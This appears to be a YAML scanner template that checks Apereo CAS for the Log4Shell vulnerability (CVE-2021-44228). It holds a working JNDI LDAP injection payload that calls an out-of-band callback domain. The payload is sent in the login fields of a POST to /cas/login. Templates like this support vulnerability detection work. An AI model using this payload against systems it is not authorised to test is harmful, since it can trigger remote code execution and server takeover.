name: apereo_CAS_log4shell_RCE_vulnerability__CVE_2021_44228
transport: http
detail:
  dock: app="apereo-CAS"
  product: apereo CAS
  homepage: https://github.com/apereo/cas
  impact: <p>Attackers can use this vulnerability to execute code on the server side,
    write backdoors, obtain server permissions, and then control the entire web server.</p>
  description: <p>apereo CAS is an open source enterprise multilingual single sign-on
    solution for the Web.</p><p>apereo CAS has a log4shell RCE vulnerability. Attackers
    can use this vulnerability to execute code on the server side, write backdoors,
    obtain server permissions, and then control the entire web server.</p>
set:
  reverse: newReverse()
  payload: '${jndi:ldap://' + reverse.domain + '}'
rules: 
  r1:
    method: "POST"
    url: "/cas/login"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: username={{payload}}&password={{payload}}&execution={{payload}}&_eventId=submit&geolocation=
    follow_redirects: false
    expression: reverse.wait(5)
expression: r1()
